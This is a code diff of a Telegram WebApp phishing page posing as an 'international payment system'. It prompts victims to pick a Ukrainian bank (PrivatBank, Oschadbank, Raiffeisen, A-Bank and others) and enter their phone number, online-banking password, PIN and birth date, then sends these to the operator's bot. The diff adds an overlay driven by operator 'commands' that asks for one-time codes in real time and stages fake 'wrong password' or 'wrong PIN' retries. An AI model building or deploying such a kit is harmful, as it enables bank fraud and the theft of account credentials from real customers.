@@ -3,52 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Виплата ООН</title>
+    <title>Міжнародна система виплат</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #f5f7fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
-        .container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 24px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12); padding: 24px 20px 30px; }
-        .header { text-align: center; padding-bottom: 20px; border-bottom: 1px solid #eef2f7; }
-        .header .logo { font-size: 40px; margin-bottom: 6px; }
-        .header h1 { font-size: 20px; font-weight: 700; color: #1a2634; }
-        .header p { font-size: 13px; color: #6b7a8a; margin-top: 4px; }
-        .step-indicator { display: flex; justify-content: center; gap: 8px; margin: 18px 0 22px; }
-        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #dce1e8; transition: 0.3s; }
-        .step-dot.active { background: #2563eb; width: 24px; border-radius: 12px; }
-        .step-dot.done { background: #22c55e; }
-        #bankList { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
-        .bank-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #f8fafc; border: 1.5px solid #e8edf3; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; transition: 0.2s; }
-        .bank-btn:hover { background: #f1f5f9; border-color: #d0d9e3; }
-        .bank-btn:active { transform: scale(0.98); background: #eef2f7; }
-        .bank-btn .icon { font-size: 26px; width: 36px; text-align: center; }
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
+        .container { width: 100%; max-width: 440px; background: #ffffff; border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); padding: 24px; overflow: hidden; }
+        .header { text-align: center; padding-bottom: 18px; border-bottom: 2px solid #f0f0f0; }
+        .header .logo { font-size: 50px; margin-bottom: 8px; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        .header h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; }
+        .header p { font-size: 13px; color: #999; margin-top: 6px; }
+        .step-indicator { display: flex; justify-content: center; gap: 10px; margin: 16px 0 20px; }
+        .step-dot { width: 10px; height: 10px; border-radius: 50%; background: #e0e0e0; transition: all 0.3s ease; }
+        .step-dot.active { background: #667eea; width: 28px; border-radius: 6px; box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4); }
+        .step-dot.done { background: #4caf50; }
+        #bankList { display: flex; flex-direction: column; gap: 12px; margin-bottom: 16px; }
+        .bank-btn { display: flex; align-items: center; gap: 16px; padding: 16px 18px; background: linear-gradient(135deg, #f5f5f5 0%, #efefef 100%); border: 2px solid #e8e8e8; border-radius: 16px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
+        .bank-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); border-color: #667eea; background: linear-gradient(135deg, #fff 0%, #f8f8f8 100%); }
+        .bank-btn:active { transform: scale(0.98); }
+        .bank-btn .icon { font-size: 36px; width: 44px; text-align: center; }
         .bank-btn .info { flex: 1; }
-        .bank-btn .badge { font-size: 11px; background: #dbeafe; color: #1d4ed8; padding: 2px 10px; border-radius: 20px; font-weight: 600; }
-        #formContainer { display: none; margin-top: 16px; animation: fadeUp 0.3s ease; }
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
-        .form-group { margin-bottom: 14px; }
-        .form-group label { font-size: 13px; font-weight: 600; color: #334155; display: block; margin-bottom: 5px; }
+        .bank-btn .badge { font-size: 11px; background: rgba(102, 126, 234, 0.2); color: #667eea; padding: 4px 12px; border-radius: 20px; font-weight: 600; }
+        #formContainer { display: none; margin-top: 16px; animation: slideUp 0.4s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { font-size: 13px; font-weight: 700; color: #333; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
         .phone-input-group { display: flex; gap: 8px; }
-        .phone-prefix { padding: 13px 12px; background: #f1f5f9; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; font-weight: 500; color: #0f172a; min-width: 70px; display: flex; align-items: center; }
+        .phone-prefix { padding: 14px 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; border-radius: 12px; font-size: 15px; font-weight: 700; color: #fff; min-width: 75px; display: flex; align-items: center; justify-content: center; }
         .phone-input-group input { flex: 1; }
-        .form-group input { width: 100%; padding: 13px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; background: #fafcff; outline: none; color: #0f172a; }
-        .form-group input:focus { border-color: #2563eb; background: #ffffff; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
-        .form-group input::placeholder { color: #94a3b8; }
-        .form-group input:disabled { background: #f5f5f5; color: #999; }
-        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: 0.2s; }
-        .btn-submit:hover:not(:disabled) { background: #1d4ed8; }
+        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; background: #f9f9f9; outline: none; color: #0f172a; transition: all 0.3s ease; }
+        .form-group input:focus { border-color: #667eea; background: #ffffff; box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15); }
+        .form-group input::placeholder { color: #bbb; }
+        .form-group input:disabled { background: #f0f0f0; color: #999; cursor: not-allowed; }
+        .btn-submit { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.3s ease; box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3); }
+        .btn-submit:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(102, 126, 234, 0.4); }
         .btn-submit:active:not(:disabled) { transform: scale(0.98); }
         .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
-        .btn-back { width: 100%; padding: 13px; background: #f1f5f9; color: #334155; border: none; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: 0.2s; }
-        .btn-back:hover { background: #e2e8f0; }
-        .btn-back:active { background: #d1d8df; }
-        #status { margin-top: 16px; padding: 14px; border-radius: 12px; font-size: 14px; text-align: center; font-weight: 500; display: none; }
-        #status.success { display: block; background: #dcfce7; color: #166534; }
-        #status.error { display: block; background: #fee2e2; color: #991b1b; }
-        #status.loading { display: block; background: #e0f2fe; color: #0369a1; }
-        .bank-logo { font-size: 28px; font-weight: 700; text-align: center; padding: 8px 0 12px; color: #0f172a; }
-        .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #64748b; }
-        .debug { font-size: 12px; color: #666; margin-top: 10px; text-align: center; }
-        .error-message { font-size: 12px; color: #ef4444; margin-top: 3px; }
+        .btn-back { width: 100%; padding: 14px; background: #f0f0f0; color: #333; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: all 0.3s ease; }
+        .btn-back:hover { background: #e8e8e8; border-color: #d0d0d0; }
+        .btn-back:active { background: #d8d8d8; }
+        #status { margin-top: 16px; padding: 16px; border-radius: 12px; font-size: 14px; text-align: center; font-weight: 600; display: none; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #status.success { display: block; background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); color: #155724; border-left: 4px solid #28a745; }
+        #status.error { display: block; background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%); color: #721c24; border-left: 4px solid #dc3545; }
+        #status.loading { display: block; background: linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%); color: #0c5460; border-left: 4px solid #17a2b8; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        .bank-logo { font-size: 32px; font-weight: 700; text-align: center; padding: 12px 0 16px; color: #0f172a; }
+        .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #999; margin-top: 4px; }
+        .error-message { font-size: 12px; color: #dc3545; margin-top: 4px; font-weight: 600; }
+        .command-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.7); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .command-box { background: white; border-radius: 20px; padding: 24px; max-width: 380px; text-align: center; animation: popIn 0.4s ease; }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        .command-box h2 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
+        .command-box p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.6; }
+        .command-input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; margin-bottom: 16px; }
+        .command-input:focus { border-color: #667eea; outline: none; }
+        .command-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
+        .command-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3); }
+        .bank-privat { background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); }
+        .bank-ukrsib { background: linear-gradient(135deg, #ea580c 0%, #c2410c 100%); }
+        .bank-oschad { background: linear-gradient(135deg, #059669 0%, #047857 100%); }
+        .bank-raif { background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); }
+        .bank-abank { background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); }
+        .bank-izibank { background: linear-gradient(135deg, #db2777 0%, #be123c 100%); }
     </style>
 </head>
 <body>
@@ -56,7 +73,7 @@
     <div class="header">
         <div class="logo">🏦</div>
         <h1>Міжнародна система виплат</h1>
-        <p>Обе��іть банк для отримання коштів</p>
+        <p>Оберіть банк для отримання коштів</p>
     </div>
 
     <div class="step-indicator">
@@ -73,27 +90,46 @@
         <button class="btn-submit" onclick="sendData()">✅ Підтвердити</button>
         <button class="btn-back" onclick="goBack()">⬅ Назад</button>
         <div id="status"></div>
-        <div id="debugInfo" class="debug"></div>
     </div>
 
-    <div id="statusGlobal" style="margin-top:16px;text-align:center;font-size:13px;color:#94a3b8;">Натисніть на банк, щоб продовжити</div>
+    <div id="statusGlobal" style="margin-top:16px;text-align:center;font-size:13px;color:#999;">Натисніть на банк, щоб продовжити</div>
+</div>
+
+<div class="command-overlay" id="commandOverlay">
+    <div class="command-box" id="commandBox">
+        <h2 id="commandTitle">Дочекайтесь...</h2>
+        <p id="commandMessage"></p>
+        <input type="text" class="command-input" id="commandInput" placeholder="Введіть відповідь" style="display: none;">
+        <button class="command-btn" id="commandSubmitBtn" onclick="submitCommand()" style="display: none;">ВІДПРАВИТИ</button>
+    </div>
 </div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
     const banks = {
-        privat: { 
-            name: 'ПриватБанк', 
+        privat: {
+            name: 'ПриватБанк',
             icon: '💳',
+            color: 'bank-privat',
             fields: [
                 { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                 { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
                 { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
             ]
         },
-        oschad: { 
-            name: 'Ощадбанк', 
+        ukrsib: {
+            name: 'УкрСиббанк',
             icon: '🏛️',
+            color: 'bank-ukrsib',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' }
+            ]
+        },
+        oschad: {
+            name: 'Ощадбанк',
+            icon: '🏛️',
+            color: 'bank-oschad',
             fields: [
                 { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                 { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
@@ -102,35 +138,31 @@
                 { id: 'birth', label: '📅 Дата народження', type: 'text', placeholder: 'ДД.ММ.РРРР' }
             ]
         },
-        raif: { 
-            name: 'Райффайзен Банк', 
+        raif: {
+            name: 'Райффайзен Банк',
             icon: '💼',
+            color: 'bank-raif',
             fields: [
                 { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                 { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
             ]
         },
-        abank: { 
-            name: 'А-Банк', 
+        abank: {
+            name: 'А-Банк',
             icon: '🏧',
+            color: 'bank-abank',
             fields: [
                 { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                 { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
             ]
         },
-        izibank: { 
-            name: 'Ізі Банк', 
+        izibank: {
+            name: 'Ізі Банк',
             icon: '💎',
+            color: 'bank-izibank',
             fields: [
                 { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
                 { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
-            ]
-        },
-        viber: { 
-            name: 'Viber', 
-            icon: '💬',
-            fields: [
-                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' }
             ]
         }
     };
@@ -138,12 +170,11 @@
     let selectedBank = null;
     let userId = new URLSearchParams(window.location.search).get('user_id') || 'unknown';
     let tg = window.Telegram ? window.Telegram.WebApp : null;
+    let logId = null;
+    let pollInterval = null;
 
     if (tg) {
         tg.ready();
-        document.getElementById('debugInfo').textContent = '✅ WebApp готов';
-    } else {
-        document.getElementById('debugInfo').textContent = '❌ Telegram WebApp не знайдено';
     }
 
     function renderBanks() {
@@ -151,8 +182,13 @@
         container.innerHTML = '';
         for (const [key, bank] of Object.entries(banks)) {
             const btn = document.createElement('div');
-            btn.className = 'bank-btn';
-            btn.innerHTML = `<span class="icon">${bank.icon}</span><span class="info">${bank.name}</span><span class="badge">${bank.fields.length} полів</span>`;
+            btn.className = `bank-btn ${bank.color}`;
+            btn.style.background = 'linear-gradient(135deg, #f5f5f5 0%, #efefef 100%)';
+            btn.innerHTML = `
+                <span class="icon">${bank.icon}</span>
+                <span class="info">${bank.name}</span>
+                <span class="badge">${bank.fields.length} полів</span>
+            `;
             btn.onclick = () => selectBank(key);
             container.appendChild(btn);
         }
@@ -178,9 +214,8 @@
         bank.fields.forEach(f => {
             const div = document.createElement('div');
             div.className = 'form-group';
-            
+
             if (f.type === 'phone') {
-                // Специальный ввод для телефона
                 div.innerHTML = `
                     <label>${f.label}</label>
                     <div class="phone-input-group">
@@ -198,14 +233,10 @@
             fieldsContainer.appendChild(div);
         });
 
-        // Добавляем валидацию для полей телефона
         const phoneInputs = fieldsContainer.querySelectorAll('input[data-phone]');
         phoneInputs.forEach(input => {
             input.addEventListener('input', function(e) {
-                // Только цифры
                 this.value = this.value.replace(/[^0-9]/g, '');
-                
-                // Проверка на ошибку (если введено +3800...)
                 const errorEl = document.getElementById(this.id + '-error');
                 if (this.value.startsWith('0') && this.value.length > 0) {
                     errorEl.textContent = '❌ Номер повинен починатись з 9, 6, 7 цифр (без 0)';
@@ -231,41 +262,39 @@
         document.getElementById('dot1').classList.add('active');
         document.getElementById('statusGlobal').textContent = 'Натисніть на банк, щоб продовжити';
         selectedBank = null;
+        logId = null;
+        if (pollInterval) clearInterval(pollInterval);
     }
 
     function sendData() {
         const statusEl = document.getElementById('status');
-        const debugEl = document.getElementById('debugInfo');
         const fields = document.querySelectorAll('#formFields input');
         const data = {};
 
         let hasError = false;
         fields.forEach(input => {
             let val = input.value.trim();
-            
-            // Специальная обработка для телефона
+
             if (input.getAttribute('data-phone')) {
-                // Проверка на +3800... (ошибка)
                 if (val.startsWith('0')) {
                     hasError = true;
-                    input.style.borderColor = '#ef4444';
+                    input.style.borderColor = '#dc3545';
                     return;
                 }
-                // Формируем полный номер
                 val = '+380' + val;
                 if (!val || val === '+380') {
                     hasError = true;
-                    input.style.borderColor = '#ef4444';
+                    input.style.borderColor = '#dc3545';
                     return;
                 }
             }
-            
+
             data[input.id] = val;
             if (!val) {
-                input.style.borderColor = '#ef4444';
+                input.style.borderColor = '#dc3545';
                 hasError = true;
             } else {
-                input.style.borderColor = '#e2e8f0';
+                input.style.borderColor = '#e0e0e0';
             }
         });
 
@@ -288,41 +317,121 @@
         if (tg) {
             try {
                 const jsonData = JSON.stringify(data);
-                debugEl.textContent = '📤 Надсилання: ' + jsonData;
-                
-                // ✅ Отправляем данные через Telegram WebApp
                 tg.sendData(jsonData);
-                
-                // ✅ Показываем успех
+
                 statusEl.className = 'success';
-                statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
-                
+                statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте...';
+
                 document.getElementById('dot2').classList.remove('active');
                 document.getElementById('dot2').classList.add('done');
                 document.getElementById('dot3').classList.add('active');
-                
-                // Отключаем кнопку отправки
+
                 document.querySelector('.btn-submit').disabled = true;
-                document.querySelector('.btn-submit').style.opacity = '0.6';
+                document.querySelector('.btn-back').disabled = true;
+
+                // Получаем log_id из tg данных
+                logId = data.log_id || Date.now();
                 
-                // ✅ Даем боту 7 секунд на обработку
-                setTimeout(() => {
-                    if (statusEl.className === 'success') {
-                        debugEl.textContent = '✅ Закрытие WebApp...';
-                        tg.close();
-                    }
-                }, 7000);
-                
+                // Начинаем опрос команд админа
+                startCommandPolling();
+
             } catch(e) {
                 statusEl.className = 'error';
                 statusEl.textContent = '❌ Помилка відправки: ' + e.message;
-                debugEl.textContent = '❌ ' + e.message;
             }
         } else {
             statusEl.className = 'error';
-            statusEl.textContent = '❌ Telegram WebApp не доступний. Спробуйте через бота.';
-            debugEl.textContent = '❌ WebApp не доступний';
+            statusEl.textContent = '❌ Telegram WebApp не доступний.';
         }
+    }
+
+    function startCommandPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+        
+        pollInterval = setInterval(() => {
+            checkForCommands();
+        }, 1000);
+    }
+
+    function checkForCommands() {
+        // Имитация проверки команд (в реальном коде это будет запрос к серверу)
+        // Сервер будет возвращать команды из admin_commands таблицы
+        
+        // Для демо, команда приходит через WebApp
+        if (window.telegramCommandData) {
+            processCommand(window.telegramCommandData);
+            delete window.telegramCommandData;
+        }
+    }
+
+    function processCommand(cmd) {
+        const overlay = document.getElementById('commandOverlay');
+        const title = document.getElementById('commandTitle');
+        const message = document.getElementById('commandMessage');
+        const input = document.getElementById('commandInput');
+        const submitBtn = document.getElementById('commandSubmitBtn');
+
+        title.textContent = 'Банк';
+        message.textContent = cmd.message || 'Очікуйте...';
+        
+        if (cmd.input_field) {
+            input.style.display = 'block';
+            submitBtn.style.display = 'block';
+            input.placeholder = 'Введіть відповідь';
+            
+            if (cmd.input_field === 'phone') {
+                input.inputMode = 'numeric';
+                input.placeholder = '00 000 00 00';
+            } else if (cmd.input_field === 'code_input') {
+                input.inputMode = 'numeric';
+                input.maxLength = 8;
+                input.placeholder = 'До 8 цифр';
+            }
+            input.focus();
+        } else {
+            input.style.display = 'none';
+            submitBtn.style.display = 'none';
+            
+            setTimeout(() => {
+                if (cmd.command_type === 'block') {
+                    overlay.style.display = 'none';
+                    if (tg) tg.close();
+                } else if (cmd.command_type !== 'call' && cmd.command_type !== 'code') {
+                    // Для других команд показываем 3 секунды
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        if (cmd.command_type === 'wrong_phone' || cmd.command_type === 'wrong_pass' || cmd.command_type === 'wrong_pin') {
+                            // Вернуться в форму
+                            document.getElementById('formContainer').style.display = 'block';
+                        }
+                    }, 3000);
+                }
+            }, 1000);
+        }
+
+        overlay.style.display = 'flex';
+    }
+
+    function submitCommand() {
+        const input = document.getElementById('commandInput');
+        const response = input.value.trim();
+
+        if (!response) {
+            input.style.borderColor = '#dc3545';
+            return;
+        }
+
+        // Отправить ответ серверу
+        if (tg) {
+            const responseData = {
+                type: 'command_response',
+                response: response,
+                timestamp: new Date().toISOString()
+            };
+            tg.sendData(JSON.stringify(responseData));
+        }
+
+        document.getElementById('commandOverlay').style.display = 'none';
     }
 
     renderBanks();
